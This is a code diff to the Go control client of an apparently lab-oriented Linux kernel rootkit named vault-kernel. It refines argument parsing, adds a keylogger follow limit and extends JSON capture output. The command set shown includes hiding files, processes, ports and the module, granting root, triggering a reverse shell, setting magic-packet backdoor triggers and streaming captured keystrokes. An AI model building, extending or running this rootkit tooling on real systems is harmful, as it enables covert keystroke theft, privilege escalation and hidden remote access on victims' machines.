@@ -16,7 +16,7 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.10"
+const clientVersion = "3.11"
 
 // Poll interval contract of `keylog --follow` (milliseconds), mirrored
 // by KEYLOG_DEFAULT_INTERVAL_MS / KEYLOG_MIN_INTERVAL_MS in the Python CLI.
@@ -105,6 +105,46 @@ func strictArgs(args []string, want int, usage string) error {
 		return fmt.Errorf("%s", usage)
 	}
 	return nil
+}
+
+// posixOperandArgs applies the POSIX end-of-options convention to the
+// positional-operand commands, closing the v3.11 parity gap with the
+// argparse surface of the Python client (verified cell by cell):
+//
+//	args           -> verbatim (no escape present)
+//	["--", "-foo"] -> ["-foo"]   the escape hands it to the operand
+//	["-foo"]       -> ERROR      argparse: "no such option: -foo"
+//	["-"]          -> verbatim   POSIX stdin-style operand, accepted
+//	["-5"]         -> verbatim   negative numbers stay operands
+//	                              (give-root's pid<=0 = self)
+//
+// Before v3.11 Go accepted the bare "-foo" form the Python client
+// rejects (the kernel received a flag-looking name) and rejected the
+// "--" form the Python client accepts (strictArgs counted the marker
+// as an unexpected extra operand): the same command, two grammars.
+func posixOperandArgs(args []string) ([]string, error) {
+	if len(args) == 0 {
+		return args, nil
+	}
+	if args[0] == "--" {
+		return args[1:], nil
+	}
+	if len(args[0]) > 1 && strings.HasPrefix(args[0], "-") && !looksNegativeNumber(args[0]) {
+		return nil, fmt.Errorf("unknown option: %s (use '-- %s' to pass it as an operand)", args[0], args[0])
+	}
+	return args, nil
+}
+
+// looksNegativeNumber reports whether s is a negative number literal
+// ("-5", "-3.5"): argparse keeps such tokens as POSITIONAL values when
+// the parser registers no negative-number-like options, so give-root
+// -5 must keep working in both clients.
+func looksNegativeNumber(s string) bool {
+	if s == "" || s[0] != '-' {
+		return false
+	}
+	_, err := strconv.ParseFloat(s, 64)
+	return err == nil
 }
 
 // parseFlagOnly is the strict grammar of commands whose ONLY argument
@@ -350,6 +390,7 @@ type keylogOpts struct {
 	timestamps bool
 	intervalMs int
 	outputPath string
+	stopAfter  int // v3.11: stop cleanly after N follow events (0 = unlimited)
 }
 
 // parseKeylogArgs owns the `keylog` argument grammar:
@@ -366,6 +407,10 @@ type keylogOpts struct {
 // is unit-testable without a device (v3.8 — before, any arg that was not
 // `--follow` was silently ignored in the one-shot path).  v3.10 adds the
 // flag-value rule: a FILE operand starting with '-' is rejected.
+// v3.11 adds --stop-after N (follow only, N >= 1, at most once): the
+// follow loop stops cleanly after the Nth emitted event — finite
+// capture windows for scripts.  Without --follow it is a usage error
+// (same rule as --timestamps: the one-shot reads exactly one buffer).
 func parseKeylogArgs(args []string) (keylogOpts, error) {
 	opts := keylogOpts{intervalMs: keylogDefaultIntervalMs}
 	seenInterval := false
@@ -375,6 +420,19 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 			opts.follow = true
 		case "--timestamps":
 			opts.timestamps = true
+		case "--stop-after":
+			if i+1 >= len(args) {
+				return opts, fmt.Errorf("--stop-after requires an N operand")
+			}
+			if opts.stopAfter != 0 {
+				return opts, fmt.Errorf("--stop-after given more than once")
+			}
+			i++
+			n, err := strconv.Atoi(args[i])
+			if err != nil || n < 1 {
+				return opts, fmt.Errorf("invalid --stop-after: %s (events, >= 1)", args[i])
+			}
+			opts.stopAfter = n
 		case "--output":
 			if i+1 >= len(args) {
 				return opts, fmt.Errorf("--output requires a FILE operand")
@@ -393,7 +451,7 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 			}
 		default:
 			if !opts.follow || seenInterval {
-				return opts, fmt.Errorf("usage: vault_kernel keylog [--follow [ms]] [--timestamps] [--output FILE]")
+				return opts, fmt.Errorf("usage: vault_kernel keylog [--follow [ms]] [--timestamps] [--output FILE] [--stop-after N]")
 			}
 			n, err := strconv.Atoi(args[i])
 			if err != nil || n < keylogMinIntervalMs {
@@ -406,40 +464,81 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 	if opts.timestamps && !opts.follow {
 		return opts, fmt.Errorf("--timestamps requires --follow")
 	}
+	if opts.stopAfter != 0 && !opts.follow {
+		return opts, fmt.Errorf("--stop-after requires --follow")
+	}
 	return opts, nil
 }
 
-// parseCaptureArgs owns the `capture` argument grammar (v3.9):
+// parseCaptureArgs owns the `capture` argument grammar (v3.9,
+// extended in v3.11 with --stdout):
 //
-//	capture [--out FILE]
+//	capture [--out FILE] [--stdout]
 //
 // Strict like the rest of the v3.8/v3.9 grammars: --out takes exactly
 // one FILE operand and may appear at most once (v3.10: a FILE operand
-// starting with '-' is rejected); any other token is a usage error.
-// Without --out the bundle goes to stdout.
-func parseCaptureArgs(args []string) (string, error) {
+// starting with '-' is rejected); --stdout is a boolean flag and may
+// also appear at most once; any other token is a usage error.
+// Without --out the bundle goes to stdout. With BOTH --out and
+// --stdout the file is written AND the JSON document is printed to
+// stdout (the one-line summary moves to stderr, so `capture --out f
+// --stdout | jq` stays a clean JSON pipeline). --stdout without --out
+// is accepted and redundant — lab scripts can pass it unconditionally.
+func parseCaptureArgs(args []string) (string, bool, error) {
 	outPath := ""
+	forceStdout := false
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
 		case "--out":
 			if i+1 >= len(args) {
-				return "", fmt.Errorf("--out requires a FILE operand")
+				return "", false, fmt.Errorf("--out requires a FILE operand")
 			}
 			if outPath != "" {
-				return "", fmt.Errorf("--out given more than once")
+				return "", false, fmt.Errorf("--out given more than once")
 			}
 			i++
 			outPath = args[i]
 			if outPath == "" || strings.HasPrefix(outPath, "-") {
 				// v3.10: same flag-value rule as --output — `capture
 				// --out --json` used to eat --json as the path.
-				return "", fmt.Errorf("--out requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", outPath)
+				return "", false, fmt.Errorf("--out requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", outPath)
 			}
+		case "--stdout":
+			if forceStdout {
+				return "", false, fmt.Errorf("--stdout given more than once")
+			}
+			forceStdout = true
 		default:
-			return "", fmt.Errorf("usage: vault_kernel capture [--out FILE]")
+			return "", false, fmt.Errorf("usage: vault_kernel capture [--out FILE] [--stdout]")
 		}
 	}
-	return outPath, nil
+	return outPath, forceStdout, nil
+}
+
+// emitCaptureBundle delivers an already-marshalled evidence bundle
+// (pure aside from the file write, so the delivery matrix is
+// unit-testable with a temp directory — v3.11):
+//
+//	outPath empty          -> JSON to stdout
+//	outPath + no --stdout  -> file 0600, one-line summary to stdout
+//	outPath + --stdout     -> file 0600, JSON to stdout, summary to
+//	                          stderr (stdout stays pure JSON for jq)
+func emitCaptureBundle(j []byte, outPath string, forceStdout bool) error {
+	if outPath == "" {
+		fmt.Println(string(j))
+		return nil
+	}
+	if err := os.WriteFile(outPath, append(j, '\n'), 0600); err != nil {
+		return fmt.Errorf("capture: cannot write %s: %w", outPath, err)
+	}
+	summary := fmt.Sprintf("[+] Evidence bundle written to %s (%d bytes)\n", outPath, len(j)+1)
+	if forceStdout {
+		fmt.Println(string(j))
+		fmt.Fprint(os.Stderr, summary)
+	} else {
+		fmt.Print(summary)
+	}
+	return nil
 }
 
 // formatKeylogEvent renders one follow event — mirrors
@@ -495,7 +594,10 @@ func (s *keylogSink) close() {
 // Since v3.10 BOTH Ctrl-C and SIGTERM stop the loop cleanly with a
 // farewell line (parity with the Python client, which always had the
 // message): systemd/pkill -TERM no longer cut the stream mid-write.
-func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string) error {
+// v3.11: with stopAfter > 0 the loop returns cleanly after the Nth
+// emitted event (same farewell path as the signals) — finite capture
+// windows for scripts.
+func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string, stopAfter int) error {
 	var sink *keylogSink
 	if outputPath != "" {
 		var err error
@@ -506,13 +608,18 @@ func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string
 		defer sink.close()
 		fmt.Printf("[*] Recording to %s\n", outputPath)
 	}
-	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
+	if stopAfter > 0 {
+		fmt.Printf("[*] Following keystroke log (poll %d ms, stop after %d events) — Ctrl-C to stop\n", intervalMs, stopAfter)
+	} else {
+		fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
+	}
 
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
 	defer signal.Stop(sig)
 
 	prev := ""
+	emitted := 0
 	for {
 		buf := make([]byte, 4096)
 		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0])); err != 0 {
@@ -535,6 +642,11 @@ func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string
 				}
 			}
 			prev = cur
+			emitted++
+			if stopAfter > 0 && emitted >= stopAfter {
+				fmt.Println("\n[*] Follow stopped")
+				return nil
+			}
 		}
 		select {
 		case <-sig:
@@ -794,11 +906,12 @@ func buildCaptureReport(statsRaw map[string]string, hidden ioctl.HiddenList, key
 }
 
 // runCapture reads stats, the hidden list and the keylog buffer in one
-// pass and emits the evidence bundle. With outPath it writes the file
-// (0600 — captures may contain keystrokes) and prints a one-line
-// summary; without it the JSON goes to stdout like the other --json
-// commands.
-func runCapture(f *os.File, outPath string) error {
+// pass and emits the evidence bundle through emitCaptureBundle: with
+// outPath it writes the file (0600 — captures may contain keystrokes)
+// and prints a one-line summary (to stderr as well when --stdout asks
+// for a pure-JSON stdout); without it the JSON goes to stdout like the
+// other --json commands.
+func runCapture(f *os.File, outPath string, forceStdout bool) error {
 	statsBuf := make([]byte, 4096)
 	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0])); err != 0 {
 		return fmt.Errorf("capture: GET_STATS failed: %w", err)
@@ -825,15 +938,7 @@ func runCapture(f *os.File, outPath string) error {
 	if err != nil {
 		return err
 	}
-	if outPath == "" {
-		fmt.Println(string(j))
-		return nil
-	}
-	if err := os.WriteFile(outPath, append(j, '\n'), 0600); err != nil {
-		return fmt.Errorf("capture: cannot write %s: %w", outPath, err)
-	}
-	fmt.Printf("[+] Evidence bundle written to %s (%d bytes)\n", outPath, len(j)+1)
-	return nil
+	return emitCaptureBundle(j, outPath, forceStdout)
 }
 
 // hiddenJSONEnvelope wraps the parsed hidden list with the schema
@@ -1181,20 +1286,28 @@ func runStatus(jsonMode bool) error {
 // parsePIDArg for hide-pid/unhide-pid (pure; unit-testable).
 func parsePIDArgs(args []string, cmd string) (int, error) {
 	usage := "usage: vault_kernel " + cmd + " <pid>"
-	if err := strictArgs(args, 1, usage); err != nil {
+	rest, err := posixOperandArgs(args)
+	if err != nil {
 		return 0, err
 	}
-	return parsePIDArg(args[0])
+	if err := strictArgs(rest, 1, usage); err != nil {
+		return 0, err
+	}
+	return parsePIDArg(rest[0])
 }
 
 // parsePortArgs combines the strict one-operand grammar with
 // parsePortArg for hide-port/unhide-port (pure; unit-testable).
 func parsePortArgs(args []string, cmd string) (uint16, error) {
 	usage := "usage: vault_kernel " + cmd + " <port>"
-	if err := strictArgs(args, 1, usage); err != nil {
+	rest, err := posixOperandArgs(args)
+	if err != nil {
 		return 0, err
 	}
-	return parsePortArg(args[0])
+	if err := strictArgs(rest, 1, usage); err != nil {
+		return 0, err
+	}
+	return parsePortArg(rest[0])
 }
 
 // watchOpts is the parsed argument set of the `watch` command.
@@ -1280,10 +1393,14 @@ Commands:
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
-  keylog [--follow [ms]] [--timestamps] [--output FILE]
-                          Read captured keystrokes (stream with --follow)
+  keylog [--follow [ms]] [--timestamps] [--output FILE] [--stop-after N]
+                          Read captured keystrokes (stream with --follow;
+                          --stop-after N ends the stream after N events)
   keylog-clear            Clear keylogger buffer
-  capture [--out FILE]    Evidence bundle: stats + hidden + keylog as JSON
+  capture [--out FILE] [--stdout]
+                          Evidence bundle: stats + hidden + keylog as JSON;
+                          --stdout ALSO prints the JSON to stdout (summary
+                          moves to stderr, so the pipe stays pure JSON)
   hide-module             Hide rootkit from lsmod
   unhide-module           Make rootkit visible in lsmod
   reset                   Clear ALL hidden files, PIDs and ports
@@ -1332,7 +1449,12 @@ func run() error {
 	if os.Args[1] == "magic-encode" {
 		// v3.9: grammar extracted to a pure function (extras were
 		// silently ignored; the port check was duplicated inline).
-		word, port, err := parseMagicEncodeArgs(os.Args[2:])
+		// v3.11: POSIX end-of-options like argparse.
+		rest, err := posixOperandArgs(os.Args[2:])
+		if err != nil {
+			return err
+		}
+		word, port, err := parseMagicEncodeArgs(rest)
 		if err != nil {
 			return err
 		}
@@ -1349,7 +1471,12 @@ func run() error {
 
 	switch cmd {
 	case "give-root":
-		pid, err := parseGiveRootPID(os.Args[2:])
+		// v3.11: POSIX end-of-options (-- -5) like argparse.
+		rest, err := posixOperandArgs(os.Args[2:])
+		if err != nil {
+			return err
+		}
+		pid, err := parseGiveRootPID(rest)
 		if err != nil {
 			return err
 		}
@@ -1357,17 +1484,27 @@ func run() error {
 
 	case "hide-file":
 		// v3.9 strict grammar: `hide-file a b` used to hide "a" and
-		// silently drop "b".
-		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel hide-file <name>"); err != nil {
+		// silently drop "b".  v3.11: POSIX escape for dash-leading
+		// names (`hide-file -- -foo`), bare "-foo" rejected like
+		// argparse.
+		rest, err := posixOperandArgs(os.Args[2:])
+		if err != nil {
 			return err
 		}
-		return hideFile(f, os.Args[2])
+		if err := strictArgs(rest, 1, "usage: vault_kernel hide-file <name>"); err != nil {
+			return err
+		}
+		return hideFile(f, rest[0])
 
 	case "unhide-file":
-		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel unhide-file <name>"); err != nil {
+		rest, err := posixOperandArgs(os.Args[2:])
+		if err != nil {
 			return err
 		}
-		return unhideFile(f, os.Args[2])
+		if err := strictArgs(rest, 1, "usage: vault_kernel unhide-file <name>"); err != nil {
+			return err
+		}
+		return unhideFile(f, rest[0])
 
 	case "hide-pid":
 		// v3.9: pid >= 1 (the module stores any int verbatim; a
@@ -1432,19 +1569,29 @@ func run() error {
 	case "shell":
 		// v3.9: real ip:port validation (host non-empty, port 1-65535)
 		// instead of a bare "contains :" check; extras rejected.
-		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel shell <ip:port>"); err != nil {
+		// v3.11: POSIX end-of-options like argparse.
+		rest, err := posixOperandArgs(os.Args[2:])
+		if err != nil {
 			return err
 		}
-		if err := parseShellTarget(os.Args[2]); err != nil {
+		if err := strictArgs(rest, 1, "usage: vault_kernel shell <ip:port>"); err != nil {
 			return err
 		}
-		return backdoorShell(f, os.Args[2])
+		if err := parseShellTarget(rest[0]); err != nil {
+			return err
+		}
+		return backdoorShell(f, rest[0])
 
 	case "magic":
-		if err := strictArgs(os.Args[2:], 1, "usage: vault_kernel magic <word>"); err != nil {
+		// v3.11: POSIX end-of-options like argparse.
+		rest, err := posixOperandArgs(os.Args[2:])
+		if err != nil {
 			return err
 		}
-		return backdoorMagic(f, os.Args[2])
+		if err := strictArgs(rest, 1, "usage: vault_kernel magic <word>"); err != nil {
+			return err
+		}
+		return backdoorMagic(f, rest[0])
 
 	case "keylog":
 		opts, err := parseKeylogArgs(os.Args[2:])
@@ -1452,16 +1599,16 @@ func run() error {
 			return err
 		}
 		if opts.follow {
-			return keylogFollow(f, opts.intervalMs, opts.timestamps, opts.outputPath)
+			return keylogFollow(f, opts.intervalMs, opts.timestamps, opts.outputPath, opts.stopAfter)
 		}
 		return keylogRead(f, opts.outputPath)
 
 	case "capture":
-		outPath, err := parseCaptureArgs(os.Args[2:])
+		outPath, forceStdout, err := parseCaptureArgs(os.Args[2:])
 		if err != nil {
 			return err
 		}
-		return runCapture(f, outPath)
+		return runCapture(f, outPath, forceStdout)
 
 	case "keylog-clear":
 		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel keylog-clear"); err != nil {
@@ -1492,8 +1639,24 @@ func run() error {
 	}
 }
 
+// deviceRequired reports whether a command opens /dev/vault_kernel.
+// The pre-device commands are usable WITHOUT root by design — status
+// is THE no-root check since v3.10, version/help are pure prints and
+// magic-encode is pure computation — and warning on them contradicted
+// that contract (a non-root lab script got a scary stderr line on the
+// exact workflow v3.10 enabled).  Unknown commands skip the warning
+// too: openDevice()'s "is rootkit loaded?" error is the honest answer
+// for them.  Fixed in v3.11 (Python parity: same list).
+func deviceRequired(cmd string) bool {
+	switch cmd {
+	case "status", "version", "-v", "--version", "help", "-h", "--help", "magic-encode":
+		return false
+	}
+	return true
+}
+
 func main() {
-	if os.Geteuid() != 0 {
+	if len(os.Args) > 1 && deviceRequired(os.Args[1]) && os.Geteuid() != 0 {
 		fmt.Fprintln(os.Stderr, "[!] Warning: not running as root. Some commands may fail.")
 	}
 	if err := run(); err != nil {
